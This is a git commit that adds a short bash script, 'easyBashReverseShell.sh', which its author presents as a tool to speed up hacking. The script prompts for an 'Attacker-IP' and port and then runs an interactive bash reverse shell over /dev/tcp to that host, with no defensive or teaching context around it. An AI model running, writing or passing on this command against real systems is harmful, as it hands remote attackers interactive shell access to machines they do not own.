f42f8a63158f29bc52f49ecb7466bdeaae96e16f
N01 <109689291+N01-S3C@users.noreply.github.com>
2023-04-19 18:03:15 +0330

    BashReverseShell
    Script to SpeedUP Hacking Bash Reverse Shell.

---
+++ easyBashReverseShell.sh
@@ -0,0 +1,17 @@
+#!/bin/bash
+#
+#this script written for boost speed hacking [BashReverseShell]. 
+
+echo
+echo '
+###########################################
+#-------------) Author: N01 (-------------#
+  #========== GitHub: S3C-N01 ==========#
+###########################################
+'
+sleep 0.3
+echo
+read -p "Enter Attacker-IP: " attip
+read -p "Enter Port: " PortSet
+echo
+/usr/bin/bash -i >& /dev/tcp/$attip/$PortSet 0>&1
